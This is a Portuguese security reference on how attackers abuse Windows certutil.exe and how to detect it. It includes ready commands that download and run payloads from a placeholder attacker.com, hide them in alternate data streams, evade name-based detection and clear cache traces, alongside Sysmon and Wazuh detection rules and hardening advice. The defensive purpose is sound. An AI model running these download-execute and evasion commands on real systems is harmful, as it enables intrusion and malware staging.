# certutil.exe

**Plataforma:** Windows (todas as versões a partir do XP)
**Categorias:** Download de arquivos, Encode/Decode, Alternate Data Streams, Bypass de detecção
**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1027.013 (Obfuscated Files — Encoding), T1564.004 (Alternate Data Streams), T1140 (Deobfuscate/Decode Files)
**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Certutil/

---

## O que é o certutil.exe

O certutil.exe é uma ferramenta de linha de comando do Windows para gerenciamento de infraestrutura de chaves públicas (PKI). Faz parte do sistema operacional desde o Windows XP e está presente em todas as versões do Windows até hoje, incluindo Server.

Suas funções legítimas incluem exibir informações sobre certificados digitais, instalar e remover certificados, fazer download de CRLs (Certificate Revocation Lists) e codificar/decodificar arquivos em base64 e hexadecimal.

O que torna o certutil tão atraente para atacantes é a combinação de três fatores: está presente em praticamente todo sistema Windows sem necessidade de instalação adicional, é assinado pela Microsoft, e possui funcionalidades de rede e manipulação de arquivos que vão muito além do que a maioria dos administradores espera de uma ferramenta de certificados.

---

## Por que atacantes usam o certutil.exe

O certutil resolve dois problemas clássicos do pós-exploração em Windows:

1. Como trazer ferramentas para dentro do ambiente sem acionar o antivírus
2. Como ofuscar payloads armazenados em disco

A capacidade de fazer download de arquivos via HTTP/HTTPS foi provavelmente adicionada para permitir que a ferramenta buscasse listas de revogação de certificados automaticamente. Atacantes descobriram que esse mesmo mecanismo pode ser usado para baixar qualquer tipo de arquivo.

Certutil foi documentado em uso por grupos como APT32 (OceanLotus), FIN7, Cobalt Group e em campanhas de ransomware. É uma das ferramentas mais citadas em relatórios de incidentes envolvendo ambientes Windows corporativos.

---

## Técnicas de abuso

### Download de arquivos

A forma mais comum de abuso do certutil é o download de arquivos externos usando a flag `-urlcache`. Essa funcionalidade foi originalmente projetada para fazer cache de CRLs e AIA (Authority Information Access), mas aceita qualquer URL.

```cmd
:: Download básico de arquivo executável
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe

:: Download para diretório temporário (mais discreto)
certutil.exe -urlcache -split -f http://attacker.com/payload.exe %TEMP%\update.exe

:: Download via HTTPS (o conteúdo é cifrado em trânsito)
certutil.exe -urlcache -split -f https://attacker.com/agent.exe C:\Windows\Temp\svchost32.exe

:: Download com nome que imita processos legítimos do Windows
certutil.exe -urlcache -split -f https://attacker.com/rat.exe C:\Windows\System32\msupdater.exe
```

A flag `-split` instrui o certutil a dividir o arquivo em partes durante o download, comportamento relacionado ao processamento de certificados binários. Na prática, o arquivo é baixado completo da mesma forma, mas sem esse flag alguns endpoints rejeitem o formato esperado pelo certutil.

**Nota sobre o cache:** o certutil mantém um cache local das URLs acessadas em `%LocalAppData%\Microsoft\Windows\INetCache`. Isso cria um artefato forense valioso: mesmo que o arquivo baixado seja deletado, a URL e o conteúdo podem permanecer no cache.

```cmd
:: Ver o conteúdo do cache do certutil (artefato forense importante)
certutil.exe -urlcache *

:: Limpar o cache (atacantes frequentemente fazem isso para cobrir rastros)
certutil.exe -urlcache -f http://attacker.com/payload.exe delete
```

### Encode e decode de arquivos (base64 e hexadecimal)

O certutil consegue codificar e decodificar arquivos em base64 e hexadecimal. Isso tem dois usos ofensivos principais: ofuscar payloads armazenados em disco e contornar filtros de conteúdo que inspecionam o cabeçalho de arquivos.

```cmd
:: Codificar um arquivo em base64
certutil.exe -encode payload.exe payload.b64

:: Decodificar de base64 para binário
certutil.exe -decode payload.b64 payload.exe

:: Codificar em hexadecimal
certutil.exe -encodehex payload.exe payload.hex

:: Decodificar de hexadecimal
certutil.exe -decodehex payload.hex payload.exe
```

Um fluxo de ataque típico usando encode/decode:

1. O atacante converte o payload para base64 em sua máquina
2. O arquivo base64 passa facilmente por filtros de e-mail ou upload de arquivos (parece texto simples)
3. No sistema alvo, `certutil -decode` reconstrói o binário original
4. O binário é executado

Esse método foi muito usado para contornar soluções de e-mail security que bloqueiam anexos executáveis mas permitem arquivos `.txt` ou `.b64`.

### Alternate Data Streams (ADS)

O sistema de arquivos NTFS suporta múltiplos fluxos de dados em um mesmo arquivo — os chamados Alternate Data Streams. Um arquivo aparentemente inofensivo pode conter um executável escondido em um stream alternativo, invisível para o Windows Explorer e para a maioria das ferramentas de análise.

```cmd
:: Baixar payload diretamente para um ADS de arquivo inofensivo
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\readme.txt:payload.exe

:: O arquivo readme.txt existirá com tamanho zero ou mínimo
:: O payload está no stream :payload.exe, invisível no Explorer

:: Executar o payload do ADS (via wscript, rundll32, etc.)
wscript C:\Windows\Temp\readme.txt:payload.js
rundll32.exe C:\Windows\Temp\readme.txt:payload.dll,EntryPoint
```

O uso de ADS é poderoso porque o arquivo "container" pode ser qualquer arquivo legítimo existente no sistema, e o payload escondido não é visível com `dir` padrão (apenas com `dir /r`).

### Download e execução em uma linha

Em shells PowerShell ou cmd, o certutil pode ser encadeado com outros comandos para baixar e executar em sequência:

```cmd
:: Download e execução imediata
certutil.exe -urlcache -split -f http://attacker.com/payload.exe %TEMP%\p.exe && %TEMP%\p.exe

:: Em PowerShell, combinando certutil com Start-Process
certutil.exe -urlcache -split -f http://attacker.com/agent.exe $env:TEMP\svc.exe; Start-Process $env:TEMP\svc.exe
```

### Uso para verificar a conectividade de rede (reconhecimento)

O certutil pode ser usado para testar se um host tem acesso a um servidor externo, servindo como ferramenta de reconhecimento de rede em ambientes segmentados.

```cmd
:: Testar conectividade para servidor externo
certutil.exe -ping attacker.com

:: Tentar download de URL como teste de conectividade (não salva arquivo)
certutil.exe -urlcache -f http://attacker.com/beacon.txt NUL
```

---

## Técnicas de bypass e evasão

### Bypass de detecção por nome de processo

Algumas soluções de segurança monitoram apenas o nome do processo. O certutil.exe pode ser copiado e renomeado antes de ser usado, embora isso seja menos eficaz em ambientes com verificação de hash ou assinatura.

```cmd
:: Copiar e renomenar para contornar detecção por nome
copy C:\Windows\System32\certutil.exe C:\Windows\Temp\update.exe
C:\Windows\Temp\update.exe -urlcache -split -f http://attacker.com/payload.exe out.exe
```

Esse bypass é eficaz contra regras baseadas apenas em nome de processo, mas falha em regras que monitoram o hash do binário ou verificam a metadata do arquivo executável.

### Uso de URLs com fragmentação ou redirecionamento

Para dificultar a análise da URL de destino em logs, atacantes usam redirecionadores, encurtadores de URL ou URLs com fragmentação.

```cmd
:: Via redirecionador (a URL visível nos logs é a do redirecionador)
certutil.exe -urlcache -split -f https://bit.ly/xxxxxxxxxxx payload.exe

:: Via servidor interno comprometido como proxy
certutil.exe -urlcache -split -f http://192.168.1.100/update.exe payload.exe
```

### Encode em múltiplas camadas

Para contornar soluções que detectam a extensão `.exe` ou o header PE no conteúdo baixado:

```cmd
:: O payload está duplamente codificado: base64 do hex do binário
:: Exige dois passos de decodificação, o que pode passar por inspeção simples de conteúdo
certutil.exe -decode stage1.b64 stage1.hex
certutil.exe -decodehex stage1.hex payload.exe
```

---

## Detecção

### O que monitorar

A detecção eficaz do abuso do certutil combina análise do processo, da linha de comando e do contexto de execução.

**Indicadores de alta relevância:**

- Presença de `-urlcache` combinada com uma URL na linha de comando — qualquer uso de `-urlcache` com uma URL externa é suspeito
- Presença de `-decode` ou `-decodehex` aplicado a um arquivo que resulta em um PE (começando com `MZ`)
- certutil executado a partir de script (parent process: wscript.exe, cscript.exe, mshta.exe, cmd.exe iniciado por macro Office)
- certutil fazendo conexão de rede para endereços IP externos, especialmente para portas não padrão
- certutil escrevendo arquivos em `%TEMP%`, `%APPDATA%` ou outros diretórios de usuário

**Indicadores de média relevância:**

- certutil.exe com nome renomeado (monitorar via hash ou PE metadata)
- `-urlcache` com flag `delete` logo após um download (tentativa de cobrir rastros)
- certutil executado por processos não administrativos ou por usuários comuns

### Configuração do Sysmon

As seguintes regras no `sysmonconfig.xml` garantem captura dos eventos relevantes:

```xml
<!-- Event ID 1: criação de processo certutil com argumentos suspeitos -->
<RuleGroup name="certutil_suspicious" groupRelation="or">
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">certutil</CommandLine>
  </ProcessCreate>
</RuleGroup>

<!-- Event ID 3: conexão de rede iniciada pelo certutil -->
<RuleGroup name="certutil_network" groupRelation="or">
  <NetworkConnect onmatch="include">
    <Image condition="end with">certutil.exe</Image>
  </NetworkConnect>
</RuleGroup>
```

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0200-lolbas_download.xml -->

<group name="lolbins,lolbas,windows,download">

  <!-- certutil com -urlcache: download de arquivo externo -->
  <rule id="100300" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-urlcache</field>
    <description>certutil.exe usado para download de arquivo (possível ingress tool transfer)</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>

  <!-- certutil com -decode ou -decodehex: reconstrução de payload ofuscado -->
  <rule id="100301" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-(decode|decodehex)</field>
    <description>certutil.exe decodificando arquivo — possível reconstrução de payload ofuscado</description>
    <mitre>
      <id>T1140</id>
      <id>T1027.013</id>
    </mitre>
  </rule>

  <!-- certutil fazendo conexão de rede (Sysmon Event ID 3) -->
  <rule id="100302" level="13">
    <if_group>sysmon_event3</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <field name="win.eventdata.destinationIsIpv6">false</field>
    <description>certutil.exe iniciando conexão de rede — verificar destino</description>
    <mitre>
      <id>T1105</id>
      <id>T1071.001</id>
    </mitre>
  </rule>

  <!-- certutil renomeado: hash do PE é o mesmo mas nome difere -->
  <rule id="100303" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.originalFileName" type="pcre2">(?i)CertUtil\.exe</field>
    <field name="win.eventdata.image" type="pcre2" negate="yes">(?i)certutil\.exe$</field>
    <description>certutil.exe executado com nome alterado — tentativa de bypass por nome de processo</description>
    <mitre>
      <id>T1036.003</id>
    </mitre>
  </rule>

</group>
```

**Nota sobre a regra 100303:** o Sysmon captura o `OriginalFileName` do PE header mesmo quando o arquivo é renomeado. Isso é poderoso — um certutil.exe copiado como `update.exe` ainda terá `OriginalFileName: CertUtil.exe` e será detectado pela regra.

### Artefatos forenses para investigação

Durante a resposta a incidentes, verifique sempre:

```cmd
:: Ver histórico de URLs no cache do certutil
certutil.exe -urlcache *

:: Procurar ADSs em diretórios suspeitos
dir /r C:\Windows\Temp\
dir /r %APPDATA%\
dir /r %TEMP%\

:: Ver logs de rede do Sysmon (Event ID 3) correlacionados com o horário do incidente
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 3 -and $_.Message -like "*certutil*" }
```

### Falsos positivos comuns e como reduzir o ruído

**Administração de certificados:** administradores de sistemas legítimos usam certutil para gerenciar certificados. O uso legítimo raramente inclui `-urlcache` com URLs externas — o uso legítimo mais comum é `certutil -store`, `certutil -addstore`, `certutil -viewstore`.

**Windows Update e PKI corporativa:** o sistema operacional usa certutil internamente para verificar CRLs. Esse uso ocorre no contexto do processo `svchost.exe`, não diretamente pelo usuário, e geralmente acessa URLs da Microsoft (`*.microsoft.com`, `*.verisign.com`). Filtre por destino para reduzir ruído.

**Desenvolvedores e DevOps:** alguns pipelines de build usam certutil para converter certificados de formato. Filtre pelo usuário de serviço do CI/CD e pelo contexto de execução (diretório de trabalho dentro do repositório).

---

## Proteção e controles defensivos

**AppLocker / WDAC:** crie uma regra que bloqueie o uso de certutil.exe por usuários não administrativos. Em ambientes bem gerenciados, nenhum usuário comum deveria precisar executar certutil.

```powershell
# Regra AppLocker para bloquear certutil para usuários não administrativos
New-AppLockerPolicy -RuleType Path -Path "%SYSTEM32%\certutil.exe" -User "Everyone" -Action Deny
```

**Bloqueio de egress na camada de firewall:** certutil não deveria fazer conexões de saída na maioria dos ambientes de produção. Uma regra de firewall bloqueando conexões de saída de `certutil.exe` para IPs externos elimina o vetor de download.

**Monitoramento de rede:** configure inspeção SSL no proxy corporativo para detectar downloads de payloads via HTTPS. Correlacione o User-Agent usado pelo certutil com as requisições de rede.

**Remoção do cache:** implemente limpeza periódica do cache do certutil via GPO para reduzir a persistência de artefatos forenses que possam ser usados como staging em ataques de longa duração.

**Alertas em tempo real:** a regra 100300 acima tem nível 14 (crítico). Considere integrar com SOAR para criação automática de ticket e isolamento do host quando disparada em horário fora do expediente ou por usuário não privilegiado.

---

## Referências

- LOLBAS — certutil.exe: https://lolbas-project.github.io/lolbas/Binaries/Certutil/
- MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1027.013: https://attack.mitre.org/techniques/T1027/013/
- MITRE ATT&CK T1564.004: https://attack.mitre.org/techniques/T1564/004/
- MITRE ATT&CK T1140: https://attack.mitre.org/techniques/T1140/
- Microsoft — certutil documentation: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
